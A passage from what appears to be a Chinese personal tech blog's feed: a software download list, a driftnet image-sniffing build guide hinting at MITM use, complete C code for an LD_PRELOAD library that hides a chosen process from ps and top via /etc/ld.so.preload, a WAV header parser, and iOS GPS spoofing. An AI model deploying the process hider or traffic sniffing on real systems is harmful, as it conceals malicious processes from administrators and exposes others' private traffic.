href="https://xclient.info/s/gas-mask.html" target="_blank" rel="noopener">Download</a></td></tr></tbody></table></div><h2 id="开发相关"><a href="#开发相关" class="headerlink" title="开发相关"></a>开发相关</h2><div class="table-container"><table><thead><tr><th>名称</th><th>描述</th><th>实用程度</th><th>下载连接</th></tr></thead><tbody><tr><td>SnippetsLab</td><td>构建你的私人代码片段库</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://xclient.info/s/snippetslab.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>Navicat Premium</td><td>强大的数据库管理工具</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://xclient.info/s/navicat-premium.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>Mathematica</td><td>数学计算工具</td><td><span style="font-size:20px;line-height:20px">★★★★</span></td><td><a href="">Download</a></td></tr><tr><td>Expressions</td><td>正则表达式工具</td><td><span style="font-size:20px;line-height:20px">★★★</span></td><td><a href="https://xclient.info/s/expressions.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>File Juicer</td><td>无损文件提取器</td><td><span style="font-size:20px;line-height:20px">★★★</span></td><td><a href="https://xclient.info/s/file-juicer.html" target="_blank" rel="noopener">Download</a></td></tr></tbody></table></div><h2 id="办公软件"><a href="#办公软件" class="headerlink" title="办公软件"></a>办公软件</h2><div class="table-container"><table><thead><tr><th>名称</th><th>描述</th><th>实用程度</th><th>下载连接</th></tr></thead><tbody><tr><td>OmniPlan</td><td>项目管理流程软件</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://xclient.info/s/omni-plan.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>OmniGraffle</td><td>图表绘制工具</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://xclient.info/s/omnigraffle.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>XMind: ZEN</td><td>思维导图</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://xclient.info/s/xmind-zen.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>MarginNote</td><td>PDF阅读笔记工具</td><td><span style="font-size:20px;line-height:20px">★★★★</span></td><td><a href="https://xclient.info/s/marginnote-pro.html" target="_blank" rel="noopener">Download</a></td></tr></tbody></table></div><h2 id="媒体相关"><a href="#媒体相关" class="headerlink" title="媒体相关"></a>媒体相关</h2><div class="table-container"><table><thead><tr><th>名称</th><th>描述</th><th>实用程度</th><th>下载连接</th></tr></thead><tbody><tr><td>Boom 3D</td><td>音效增强工具</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://xclient.info/s/boom-3d.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>INNA</td><td>功能强大的开源媒体播放工具</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://github.com/iina/iina" target="_blank" rel="noopener">Download</a></td></tr></tbody></table></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Toolkit" scheme="https://vincentstudio.info/categories/Toolkit/"/>
    
    
      <category term="Software" scheme="https://vincentstudio.info/tags/Software/"/>
    
  </entry>
  
  <entry>
    <title>利用 driftnet 嗅探网络图片</title>
    <link href="https://vincentstudio.info/2019/05/24/031_Driftnet_Tutorial/"/>
    <id>https://vincentstudio.info/2019/05/24/031_Driftnet_Tutorial/</id>
    <published>2019-05-24T14:18:00.000Z</published>
    <updated>2020-01-30T08:31:10.925Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>driftnet 是 Kali Linux 中内置的一个网络图片嗅探工具，常配合 ettercap、arpsproof 或其他 arp 欺骗工具一起使用。因为在 MacOS 上安装的时候遇到了一些困难，故做此记录，方便以后查阅。以后有时间可以详细介绍一下 arp 攻击原理。本文纯粹用于技术探讨，请勿用于非法目的。</p></blockquote><h2 id="安装教程"><a href="#安装教程" class="headerlink" title="安装教程"></a>安装教程</h2><p>在 Ubuntu 或者 Kali 上安装较为简单，就不多做介绍，下面安装教程只针对 macOS。网上很多用 macports 的安装教程都不能用了，目前在 mac 上只能通过源码编译安装。</p><pre><code class="lang-bash">$ git clone https://github.com/deiv/driftnet.git$ cd driftnet$ autoreconf -fi$ ./configure$ make -j8$ make install</code></pre><h2 id="报错及解决方案"><a href="#报错及解决方案" class="headerlink" title="报错及解决方案"></a>报错及解决方案</h2><ul><li>gtk 问题</li></ul><p>把 configure 中所有 x11 替换成 quartz，下面脚本中 gtk 版本可能不一致，请自行替换。</p><pre><code class="lang-bash">sed -i &#39;.backup&#39; &#39;s/x11/quartz/g&#39; configure &amp;&amp; rm configure.backupcd /usr/local/Cellar/gtk+/2.24.31_1/include/gtk-2.0/gdkln -s gdk.h gdkx.hcd -</code></pre><ul><li>提示找不到 openssl</li></ul><pre><code class="lang-bash">export LDFLAGS=&quot;-L/usr/local/opt/openssl/lib -L/usr/local/lib -L/usr/local/opt/expat/lib&quot;export CFLAGS=&quot;-I/usr/local/opt/openssl/include/ -I/usr/local/include -I/usr/local/opt/expat/include&quot;export CPPFLAGS=&quot;-I/usr/local/opt/openssl/include/ -I/usr/local/include -I/usr/local/opt/expat/include&quot;export LIBRARY_PATH=/usr/local/opt/openssl/lib</code></pre><ul><li>ehter.h 报错</li></ul><p>编辑 src/network/layer2.c</p><pre><code class="lang-c++">#include &lt;netinet/ether.h&gt;替换成#include &lt;netinet/if_ether.h&gt;</code></pre><ul><li>编辑 src/compat/config.h</li></ul><p>在末尾追加</p><pre><code class="lang-c++">#ifndef _FUCK_ETHER__#define _FUCK_ETHER__#define ETH_ALEN 6 #define ETH_HLAN 14 #define ETH_ZLEN 60 #define ETH_DATA_LEN 1500 #define ETH_FRAME_LEN 1514 #define ETH_FCS_LEN 4  #define ETH_P_IP 0x0800#define ETH_P_IPV6 0x86DD#define ETH_P_ARP 0x0806#define ETH_P_PAE 0x888Estruct ethhdr{    unsigned char h_dest[ETH_ALEN];    unsigned char h_source[ETH_ALEN];    unsigned short h_proto;}__attribute__((packed));#endif</code></pre><h2 id="使用演示"><a href="#使用演示" class="headerlink" title="使用演示"></a>使用演示</h2><pre><code>$ driftnet -i en0 # 你的网卡名</code></pre><p>打开浏览器看一些图片，发现图片内容已经被捕获到了。</p><img src="/2019/05/24/031_Driftnet_Tutorial/driftnet.png"><p>如果再配合 MITM，你懂的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Toolkit" scheme="https://vincentstudio.info/categories/Toolkit/"/>
    
    
      <category term="Linux" scheme="https://vincentstudio.info/tags/Linux/"/>
    
      <category term="Security" scheme="https://vincentstudio.info/tags/Security/"/>
    
  </entry>
  
  <entry>
    <title>如何隐藏 Linux 进程</title>
    <link href="https://vincentstudio.info/2019/05/19/030_How_to_Hide_Linux_Process/"/>
    <id>https://vincentstudio.info/2019/05/19/030_How_to_Hide_Linux_Process/</id>
    <published>2019-05-19T15:50:00.000Z</published>
    <updated>2020-01-30T08:29:43.725Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>本文旨在学习 linux 内核原理，纯粹用于技术探讨，请勿用于非法目的。</p></blockquote><h2 id="ps指令是如何工作的？"><a href="#ps指令是如何工作的？" class="headerlink" title="ps指令是如何工作的？"></a><code>ps</code>指令是如何工作的？</h2><p>我们可以使用 <code>sysdig</code> 跟踪 <code>ps</code> 指令的执行细节</p><pre><code class="lang-bash">$ sysdig proc.name = ps...2088196 23:47:45.419817127 7 ps (22956) &gt; openat2088197 23:47:45.419818054 7 ps (22956) &lt; openat fd=6(&lt;f&gt;/proc/30245/stat) dirfd=-100(AT_FDCWD) name=/proc/30245/stat flags=1(O_RDONLY) mode=02088198 23:47:45.419818411 7 ps (22956) &gt; read fd=6(&lt;f&gt;/proc/30245/stat) size=20482088199 23:47:45.419819843 7 ps (22956) &lt; read res=182 data=30245 ((sd-pam)) S 30244 30244 30244 0 -1 1077936448 46 0 0 0 0 0 0 0 20 0 1 0 12088200 23:47:45.419820050 7 ps (22956) &gt; close fd=6(&lt;f&gt;/proc/30245/stat)2088201 23:47:45.419820178 7 ps (22956) &lt; close res=02088202 23:47:45.419822308 7 ps (22956) &gt; openat2088203 23:47:45.419824137 7 ps (22956) &lt; openat fd=6(&lt;f&gt;/proc/30245/status) dirfd=-100(AT_FDCWD) name=/proc/30245/status flags=1(O_RDONLY) mode=02088204 23:47:45.419824495 7 ps (22956) &gt; read fd=6(&lt;f&gt;/proc/30245/status) size=20482088205 23:47:45.419829683 7 ps (22956) &lt; read res=1329 data=Name:.(sd-pam).Umask:.0002.State:.S (sleeping).Tgid:.30245.Ngid:.0.Pid:.30245.PP2088206 23:47:45.419829879 7 ps (22956) &gt; close fd=6(&lt;f&gt;/proc/30245/status)2088207 23:47:45.419830002 7 ps (22956) &lt; close res=02088208 23:47:45.419831829 7 ps (22956) &gt; getdents fd=5(&lt;d&gt;/proc)2088209 23:47:45.419833030 7 ps (22956) &lt; getdents res=02088210 23:47:45.419834153 7 ps (22956) &gt; close fd=5(&lt;d&gt;/proc)2088211 23:47:45.419834873 7 ps (22956) &lt; close res=0...</code></pre><p>由此可以分析出 <code>ps</code> 的执行流程如下：</p><ol><li>通过 <code>openat</code> 函数打开目录 <code>/proc</code>。</li><li>在该进程在打开的目录上调用 <code>getdents</code> 函数，得到 <code>/proc</code> 下的目录列表</li><li>遍历每个子目录中的一组固定文件。从事件列表中可以看到，这些文件名为 <code>/proc/{PID}/status</code>，<code>/proc/PID/stat</code> 和 <code>/proc/PID/cmdline</code>，即为 <code>ps</code> 输出的信息。</li></ol><blockquote><p>进程本身不直接调用 <code>openat</code> 和 <code>getdents</code>， 因为这些是由C标准库（<code>libc</code>）抽象的系统调用。如果你曾经读过 <code>libc</code> 文档，<code>libc</code> 提供了两个不同的函数，<code>opendir</code> 和 <code>readdir</code>，它们负责自己调用系统调用，为开发人员提供了一个更简单的API。</p></blockquote><h2 id="3种隐藏进程的思路"><a href="#3种隐藏进程的思路" class="headerlink" title="3种隐藏进程的思路"></a>3种隐藏进程的思路</h2><ol><li>修改替换类似 <code>ps</code>、<code>lsof</code>、<code>top</code>、<code>htop</code> … 等常用运维工具的二进制文件。</li><li>覆盖 <code>libc</code> 中的 <code>readdir</code> 函数</li><li>修改内核中的系统调用，hook 系统的 <code>getdents</code> 事件</li></ol><p>下文采用第二种方法来实现</p><h2 id="示例代码-C"><a href="#示例代码-C" class="headerlink" title="示例代码 (C)"></a>示例代码 (C)</h2><h3 id="新建-processhider-c"><a href="#新建-processhider-c" class="headerlink" title="新建 processhider.c"></a>新建 <code>processhider.c</code></h3><p>修改 <code>process_to_filter</code> 为你要隐藏的进程名</p><pre><code class="lang-c">#define _GNU_SOURCE#include &lt;stdio.h&gt;#include &lt;dlfcn.h&gt;#include &lt;dirent.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;// !!! Replace to your Process Namestatic const char* process_to_filter = &quot;test.py&quot;;static int get_dir_name(DIR* dirp, char* buf, size_t size){    int fd = dirfd(dirp);    if(fd == -1) {        return 0;    }    char tmp[64];    snprintf(tmp, sizeof(tmp), &quot;/proc/self/fd/%d&quot;, fd);    ssize_t ret = readlink(tmp, buf, size);    if(ret == -1) {        return 0;    }    buf[ret] = 0;    return 1;}static int get_process_name(char* pid, char* buf){    if(strspn(pid, &quot;0123456789&quot;) != strlen(pid)) {        return 0;    }    char tmp[256];    snprintf(tmp, sizeof(tmp), &quot;/proc/%s/stat&quot;, pid);    FILE* f = fopen(tmp, &quot;r&quot;);    if(f == NULL) {        return 0;    }    if(fgets(tmp, sizeof(tmp), f) == NULL) {        fclose(f);        return 0;    }    fclose(f);    int unused;    sscanf(tmp, &quot;%d (%[^)]s&quot;, &amp;unused, buf);    return 1;}#define DECLARE_READDIR(dirent, readdir)                                \static struct dirent* (*original_##readdir)(DIR*) = NULL;               \                                                                        \struct dirent* readdir(DIR *dirp)                                       \{                                                                       \    if(original_##readdir == NULL) {                                    \        original_##readdir = dlsym(RTLD_NEXT, #readdir);                \        if(original_##readdir == NULL)                                  \        {                                                               \            fprintf(stderr, &quot;Error in dlsym: %s\n&quot;, dlerror());         \        }                                                               \    }                                                                   \                                                                        \    struct dirent* dir;                                                 \                                                                        \    while(1)                                                            \    {                                                                   \        dir = original_##readdir(dirp);                                 \        if(dir) {                                                       \            char dir_name[256];                                         \            char process_name[256];                                     \            if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &amp;&amp;        \                strcmp(dir_name, &quot;/proc&quot;) == 0 &amp;&amp;                       \                get_process_name(dir-&gt;d_name, process_name) &amp;&amp;          \                strcmp(process_name, process_to_filter) == 0) {         \                continue;                                               \            }                                                           \        }                                                               \        break;                                                          \    }                                                                   \    return dir;                                                         \}DECLARE_READDIR(dirent64, readdir64);DECLARE_READDIR(dirent, readdir);</code></pre><h3 id="编译成动态链接库"><a href="#编译成动态链接库" class="headerlink" title="编译成动态链接库"></a>编译成动态链接库</h3><pre><code class="lang-bash">$ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl$ mv libprocesshider.so /usr/local/lib/</code></pre><h3 id="覆盖系统调用"><a href="#覆盖系统调用" class="headerlink" title="覆盖系统调用"></a>覆盖系统调用</h3><p><code>/etc/ld.so.preload</code> 这是个神奇的文件，写在这个文件里的库会比系统标准库优先调用。因此我们只要把刚才生成好的动态链接库添加到这个文件中就大功告成了</p><pre><code class="lang-bash">$ echo /usr/local/lib/libprocesshider.so &gt;&gt; /etc/ld.so.preload</code></pre><h3 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h3><p>新建一个测试文件 <code>test.py</code></p><pre><code class="lang-python">#!/usr/bin/pythonwhile True:    print &quot;Hello&quot;</code></pre><p>执行</p><pre><code class="lang-bash">$ chmod +x test.py$ ./test.py</code></pre><p>再开一个 <code>terminal</code> 查看 <code>ps</code> 或者 <code>top</code>，发现 <code>test.py</code> 已经不见了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Tech" scheme="https://vincentstudio.info/categories/Tech/"/>
    
    
      <category term="Linux" scheme="https://vincentstudio.info/tags/Linux/"/>
    
      <category term="Security" scheme="https://vincentstudio.info/tags/Security/"/>
    
  </entry>
  
  <entry>
    <title>WAV 音频文件格式解析</title>
    <link href="https://vincentstudio.info/2019/05/15/029_WAV_Format_Parsing/"/>
    <id>https://vincentstudio.info/2019/05/15/029_WAV_Format_Parsing/</id>
    <published>2019-05-15T13:55:00.000Z</published>
    <updated>2020-01-30T08:29:43.725Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>由于最近工作中使用到了多路音频采样数据的处理，故补充一波wav格式解析的知识，本文大部分资料来源于网络，我只做了收集归纳的工作。下方附有原文连接，若有侵权，请在下方留言告知。</p></blockquote><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Waveform Audio File Format（WAVE，又或者是因为WAV后缀而被大众所知的），它采用RIFF（Resource Interchange File Format）文件格式结构。通常用来保存PCM格式的原始音频数据，所以通常被称为无损音频。但是严格意义上来讲，WAV也可以存储其它压缩格式的音频数据。</p><h2 id="格式解析"><a href="#格式解析" class="headerlink" title="格式解析"></a>格式解析</h2><p>WAV文件遵循RIFF规则，其内容以区块（chunk）为最小单位进行存储。WAV文件一般由3个区块组成：RIFF chunk、Format chunk和Data chunk。另外，文件中还可能包含一些可选的区块，如：Fact chunk、Cue points chunk、Playlist chunk、Associated data list chunk等。<br>本文将只介绍RIFF chunk、Format chunk和Data chunk。</p><img src="/2019/05/15/029_WAV_Format_Parsing/wav_format.png"><h3 id="RIFF区块"><a href="#RIFF区块" class="headerlink" title="RIFF区块"></a>RIFF区块</h3><div class="table-container"><table><thead><tr><th>名称</th><th>偏移地址</th><th>字节数</th><th>端序</th><th>内容</th></tr></thead><tbody><tr><td>ID</td><td>0x00</td><td>4Byte</td><td>大端</td><td>‘RIFF’ (0x52494646)</td></tr><tr><td>Size</td><td>0x04</td><td>4Byte</td><td>小端</td><td>fileSize - 8</td></tr><tr><td>Type</td><td>0x08</td><td>4Byte</td><td>大端</td><td>‘WAVE’(0x57415645)</td></tr></tbody></table></div><pre><code class="lang-text">ID 以&#39;RIFF&#39;为标识Size 是整个文件的长度减去 ID 和 Size 的长度Type 是WAVE表示后面需要两个子块：Format 区块和 Data 区块</code></pre><h3 id="FORMAT区块"><a href="#FORMAT区块" class="headerlink" title="FORMAT区块"></a>FORMAT区块</h3><div class="table-container"><table><thead><tr><th>名称</th><th>偏移地址</th><th>字节数</th><th>端序</th><th>内容</th></tr></thead><tbody><tr><td>ID</td><td>0x00</td><td>4Byte</td><td>大端</td><td>‘fmt ‘ (0x666D7420)</td></tr><tr><td>Size</td><td>0x04</td><td>4Byte</td><td>小端</td><td>16</td></tr><tr><td>AudioFormat</td><td>0x08</td><td>2Byte</td><td>小端</td><td>音频格式</td></tr><tr><td>NumChannels</td><td>0x0A</td><td>2Byte</td><td>小端</td><td>声道数</td></tr><tr><td>SampleRate</td><td>0x0C</td><td>4Byte</td><td>小端</td><td>采样率</td></tr><tr><td>ByteRate</td><td>0x10</td><td>4Byte</td><td>小端</td><td>每秒数据字节数</td></tr><tr><td>BlockAlign</td><td>0x14</td><td>2Byte</td><td>小端</td><td>数据块对齐</td></tr><tr><td>BitsPerSample</td><td>0x16</td><td>2Byte</td><td>小端</td><td>采样位数</td></tr></tbody></table></div><pre><code class="lang-text">ID 以&#39;fmt &#39;为标识Size 表示该区块数据的长度（不包含 ID 和 Size 的长度）AudioFormat 表示 Data 区块存储的音频数据的格式，PCM音频数据的值为1NumChannels 表示音频数据的声道数，1：单声道，2：双声道SampleRate 表示音频数据的采样率ByteRate 每秒数据字节数 = SampleRate * NumChannels * BitsPerSample / 8BlockAlign 每个采样所需的字节数 = NumChannels * BitsPerSample / 8BitsPerSample 每个采样存储的bit数，8：8bit，16：16bit，32：32bit</code></pre><h3 id="DATA区块"><a href="#DATA区块" class="headerlink" title="DATA区块"></a>DATA区块</h3><div class="table-container"><table><thead><tr><th>名称</th><th>偏移地址</th><th>字节数</th><th>端序</th><th>内容</th></tr></thead><tbody><tr><td>ID</td><td>0x00</td><td>4Byte</td><td>大端</td><td>‘data’ (0x64617461)</td></tr><tr><td>Size</td><td>0x04</td><td>4Byte</td><td>小端</td><td>N</td></tr><tr><td>Data</td><td>0x08</td><td>NByte</td><td>小端</td><td>音频数据</td></tr></tbody></table></div><pre><code class="lang-text">ID 以&#39;data&#39;为标识Size 表示音频数据的长度，N = ByteRate * secondsData 音频数据</code></pre><h2 id="小端存储"><a href="#小端存储" class="headerlink" title="小端存储"></a>小端存储</h2><blockquote><p>所谓的大端模式，是指数据的低位保存在内存的高地址中，而数据的高位，保存在内存的低地址中；<br>所谓的小端模式，是指数据的低位保存在内存的低地址中，而数据的高位保存在内存的高地址中。</p></blockquote><p>下面解释一下 PCM 数据在 WAV 文件中的 bit 位排列方式</p><div class="table-container"><table><thead><tr><th>PCM数据类型</th><th>采样</th><th>采样</th></tr></thead><tbody><tr><td>8Bit 单声道</td><td>声道0</td><td>声道0</td></tr><tr><td>8Bit 双声道</td><td>声道0</td><td>声道1</td></tr><tr><td>16Bit 单声道</td><td>声道0低位，声道0高位</td><td>声道0低位，声道0高位</td></tr><tr><td>16Bit 双声道</td><td>声道0低位，声道0高位</td><td>声道1低位，声道1高位</td></tr></tbody></table></div><h2 id="示例代码-C"><a href="#示例代码-C" class="headerlink" title="示例代码 (C)"></a>示例代码 (C)</h2><pre><code class="lang-c">#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;stdlib.h&gt;struct WAV_Format {    // riff header    uint32_t ChunkID;        // &quot;RIFF&quot;    uint32_t ChunkSize;      // 36 + Subchunk2Size    uint32_t Format;         // &quot;WAVE&quot;    // sub-chunk &quot;fmt&quot;    uint32_t Subchunk1ID;    // &quot;fmt &quot; */    uint32_t Subchunk1Size;  // 16 for PCM */    uint16_t AudioFormat;    // PCM = 1*/    uint16_t NumChannels;    // Mono = 1, Stereo = 2, etc.    uint32_t SampleRate;     // 8000, 44100, etc.    uint32_t ByteRate;       // = SampleRate * NumChannels * BitsPerSample/8    uint16_t BlockAlign;     // = NumChannels * BitsPerSample/8    uint16_t BitsPerSample;  // 8bits, 16bits, etc.    // sub-chunk &quot;data&quot;    uint32_t Subchunk2ID;    // &quot;data&quot;    uint32_t Subchunk2Size;  // data size};int main(void) {    FILE *fp = NULL;    struct WAV_Format wav;    fp = fopen(&quot;output_1.wav&quot;, &quot;rb&quot;);    if (!fp) {        printf(&quot;can&#39;t open audio file\n&quot;);        exit(1);    }    fread(&amp;wav, 1, sizeof(struct WAV_Format), fp);    printf(&quot;ChunkID \t%x\n&quot;, wav.ChunkID);    printf(&quot;ChunkSize \t%d\n&quot;, wav.ChunkSize);    printf(&quot;Format \t\t%x\n&quot;, wav.Format);    printf(&quot;Subchunk1ID \t%x\n&quot;, wav.Subchunk1ID);    printf(&quot;Subchunk1Size \t%d\n&quot;, wav.Subchunk1Size);    printf(&quot;AudioFormat \t%d\n&quot;, wav.AudioFormat);    printf(&quot;NumChannels \t%d\n&quot;, wav.NumChannels);    printf(&quot;SampleRate \t%d\n&quot;, wav.SampleRate);    printf(&quot;ByteRate \t%d\n&quot;, wav.ByteRate);    printf(&quot;BlockAlign \t%d\n&quot;, wav.BlockAlign);    printf(&quot;BitsPerSample \t%d\n&quot;, wav.BitsPerSample);    printf(&quot;Subchunk2ID \t%x\n&quot;, wav.Subchunk2ID);    printf(&quot;Subchunk2Size \t%d\n&quot;, wav.Subchunk2Size);    fclose(fp);    return 0;}</code></pre><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[1] <a href="https://www.jianshu.com/p/947528f3dff8" target="_blank" rel="noopener">WAV文件格式详解 - 简书</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Tech" scheme="https://vincentstudio.info/categories/Tech/"/>
    
    
      <category term="Audio" scheme="https://vincentstudio.info/tags/Audio/"/>
    
  </entry>
  
  <entry>
    <title>How to Fake a GPS Location on IOS</title>
    <link href="https://vincentstudio.info/2019/05/03/028_How_to_Fake_a_GPS_Location_on_IOS/"/>
    <id>https://vincentstudio.info/2019/05/03/028_How_to_Fake_a_GPS_Location_on_IOS/</id>
    <published>2019-05-03T02:00:00.000Z</published>
    <updated>2020-01-30T08:29:43.763Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h2><p><code>IPhone X</code><br><code>System: IOS 12.2</code></p><p><code>MacBook Pro 2018</code><br><code>System: macOS Mojave 10.14.4</code><br><code>IDE: Xcode v10.2</code></p><h2 id="Quick-Guide"><a href="#Quick-Guide" class="headerlink" title="Quick Guide"></a>Quick Guide</h2><h3 id="Create-Project"><a href="#Create-Project" class="headerlink" title="Create Project"></a>Create Project</h3><p>Open your Xcode and Create a new <span class="highlight">Single View App</span> project.</p><img src="/2019/05/03/028_How_to_Fake_a_GPS_Location_on_IOS/create_project.png"><h3 id="Get-GPS-Location"><a href="#Get-GPS-Location" class="headerlink" title="Get GPS Location"></a>Get GPS Location</h3><p><a href="http://www.gpsspg.com/maps.htm" target="_blank" rel="noopener">http://www.gpsspg.com/maps.htm</a></p><p>Demo: 清华大学 (40.0033348446,116.3261745921)</p><img src="/2019/05/03/028_How_to_Fake_a_GPS_Location_on_IOS/gps.png"><h3 id="Add-a-gpx-file"><a href="#Add-a-gpx-file" class="headerlink" title="Add a gpx file"></a>Add a gpx file</h3><p>Replace the latitude and longitude of the location you choose</p><img src="/2019/05/03/028_How_to_Fake_a_GPS_Location_on_IOS/add_gpx.png"><pre><code class="lang-xml">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;gpx version=&quot;1.1&quot; creator=&quot;Xcode&quot;&gt;    &lt;wpt lat=&quot;40.0033348446&quot; lon=&quot;116.326174592&quot;&gt;        &lt;name&gt;清华大学&lt;/name&gt;        &lt;time&gt;2014-09-24T14:55:37Z&lt;/time&gt;    &lt;/wpt&gt;&lt;/gpx&gt;</code></pre><h3 id="Edit-Scheme"><a href="#Edit-Scheme" class="headerlink" title="Edit Scheme"></a>Edit Scheme</h3><p>Choose Your Project &gt; Edit Scheme &gt; Options<br>Check <span class="highlight">Allow Location Simulation</span> and set <span class="highlight">Default Location</span> to your gpx file</p><img src="/2019/05/03/028_How_to_Fake_a_GPS_Location_on_IOS/edit_scheme.png"><h3 id="Connect-IPhone-and-Run-Debug"><a href="#Connect-IPhone-and-Run-Debug" class="headerlink" title="Connect IPhone and Run Debug"></a>Connect IPhone and Run Debug</h3><p>Perfect!</p><img src="/2019/05/03/028_How_to_Fake_a_GPS_Location_on_IOS/phone.png">]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Tech" scheme="https://vincentstudio.info/categories/Tech/"/>
    
    
      <category term="IOS" scheme="https://vincentstudio.info/tags/IOS/"/>
    
  </entry>
  
</feed>
